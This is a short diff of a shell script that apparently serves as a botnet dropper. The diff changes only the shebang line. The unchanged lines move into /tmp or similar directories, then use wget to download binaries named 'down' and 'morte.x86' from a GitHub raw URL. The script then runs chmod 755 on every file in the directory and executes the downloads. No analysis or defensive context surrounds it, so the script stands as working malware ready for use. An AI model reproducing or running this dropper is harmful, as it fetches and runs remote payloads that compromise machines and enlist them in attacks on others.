@@ -1,4 +1,4 @@
-#!/usr/bin/env bash
+#!/bin/sh
 ulimit -n 1024
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/down; chmod 755 *; ./down;
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/fniesonoiawp/good/refs/heads/main/morte.x86; chmod 755 *; ./morte.x86 morte.x86;
